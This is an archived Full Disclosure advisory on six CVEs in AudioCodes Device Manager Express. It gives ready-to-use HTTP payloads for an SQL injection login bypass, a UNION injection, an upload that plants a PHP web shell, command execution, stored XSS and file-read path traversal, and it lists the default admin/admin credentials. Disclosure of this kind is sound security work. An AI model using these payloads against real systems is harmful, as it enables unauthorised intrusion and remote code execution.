---
title: Multiple vulnerabilities in Audiocodes Device Manager Express
url: https://seclists.org/fulldisclosure/2023/Feb/12
source: Full Disclosure
date: 2023-02-24
fetch_date: 2025-10-04T07:59:47.610194
---

# Multiple vulnerabilities in Audiocodes Device Manager Express

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](11)
[By Date](date.html#12)
[![Next](/images/right-icon-16x16.png)](13)

[![Previous](/images/left-icon-16x16.png)](11)
[By Thread](index.html#12)
[![Next](/images/right-icon-16x16.png)](13)

![](/shared/images/nst-icons.svg#search)

# Multiple vulnerabilities in Audiocodes Device Manager Express

---

*From*: Eric Flokstra <erp.flokstra () gmail com>
*Date*: Fri, 17 Feb 2023 16:06:12 +0100

---

```
# Product Name: Device Manager Express
# Vendor Homepage: https://www.audiocodes.com
# Software Link:
https://www.audiocodes.com/solutions-products/products/management-products-solutions/device-manager
# Version: <= 7.8.20002.47752
# Tested on: Windows 10 / Server 2019
# Default credentials: admin/admin
# CVE-2022-24627, CVE-2022-24628, CVE-2022-24629, CVE-2022-24630,
CVE-2022-24631, CVE-2022-24632
# Exploit: https://github.com/00xEF/Audiocodes-Device-Manager-Express

AudioCodes' Device Manager Express features a user interface that enables
enterprise network administrators to set up, configure and update up to 500
400HD Series IP phones in globally distributed corporations.

----------------
CVE-2022-24627: An unauthenticated SQL injection exists in the p parameter
of the login form.
----------------
POST /admin/AudioCodes_files/process_login.php HTTP/1.1
Host: 10.11.12.13
".." omitted
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0)
Content-Type: application/x-www-form-urlencoded

username=admin&password=&domain=&p=%5C%27or+1%3D1%23

----------------
CVE-2022-24628: An authenticated SQL injection exists in the id parameter
of IPPhoneFirmwareEdit.php
----------------
/admin/AudioCodes_files/IPPhoneFirmwareEdit.php?action=download&id=-1338'%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20-

----------------
CVE-2022-24629: A remote code execution vulnerability exists via path
traversal in the dir parameter of the file upload functionality .
----------------
POST /admin/AudioCodes_files/BrowseFiles.php?type= HTTP/1.1
Host: 10.11.12.13
".." omitted
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0)

-----------------------------119140522224988540294045582807
Content-Disposition: form-data; name="dir"

C:/audiocodes/express/WebAdmin/admin/AudioCodes_files/ajax/
-----------------------------119140522224988540294045582807
Content-Disposition: form-data; name="type"

-----------------------------119140522224988540294045582807
Content-Disposition: form-data; name="myfile"; filename="ajaxJabra.php"
Content-Type: application/x-php

<?php echo shell_exec($_GET['x']); ?>

-----------------------------119140522224988540294045582807
Content-Disposition: form-data; name="Submit"

Upload
-----------------------------119140522224988540294045582807--

----------------
CVE-2022-24630: A remote command execution exists in an undocumented eval
function in BrowseFiles.php
----------------
POST /admin/AudioCodes_files/BrowseFiles.php?cmd=ssh HTTP/1.1
Host: 10.11.12.13
".." omitted
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0)

ssh_command=dir+C:

----------------
CVE-2022-24631: A Persistent Cross-Site Scripting exists in the desc
parameter in ajaxTenants.php
----------------
POST /admin/AudioCodes_files/ajax/ajaxTenants.php HTTP/1.1
Host: 10.11.12.13
".." omitted
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0)

action=save&id=1&name=Default&desc=%22%3E%3Cimg+src%3Dx+onerror%3Dalert(1)%3E&subnet=&isdefault=true

----------------
CVE-2022-24632: A path traversal vulnerability exists in the view parameter
of the file download functionality in BrowseFiles.php
----------------
/admin/AudioCodes_files/BrowseFiles.php?view=C:/windows/win.ini
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](11)
[By Date](date.html#12)
[![Next](/images/right-icon-16x16.png)](13)

[![Previous](/images/left-icon-16x16.png)](11)
[By Thread](index.html#12)
[![Next](/images/right-icon-16x16.png)](13)

### Current thread:

* **Multiple vulnerabilities in Audiocodes Device Manager Express** *Eric Flokstra (Feb 22)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")